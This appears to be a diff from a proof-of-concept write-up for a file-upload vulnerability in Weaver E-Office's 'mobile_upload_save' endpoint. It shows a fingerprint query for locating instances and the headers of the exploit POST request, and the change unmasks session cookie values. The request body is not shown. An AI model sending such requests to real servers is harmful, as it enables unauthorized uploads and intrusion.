@@ -78,7 +78,7 @@ app="泛微-EOffice"
 ```http
 POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1
 Content-Type: multipart/form-data; boundary=c2307d1cd1165cfacd8cd7c008f44d1e
-Cookie: testBanCookie=test; ecology_JSessionId=a*******************y; JSESSIONID=a*******************y; ecology_JSessionid=a*******************y
+Cookie: testBanCookie=test; ecology_JSessionId=abcLQ67J8J80DciAxUz5y; JSESSIONID=abcLQ67J8J80DciAxUz5y; ecology_JSessionid=abcLQ67J8J80DciAxUz5y
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
 Accept-Encoding: gzip, deflate
 Cache-Control: max-age=0
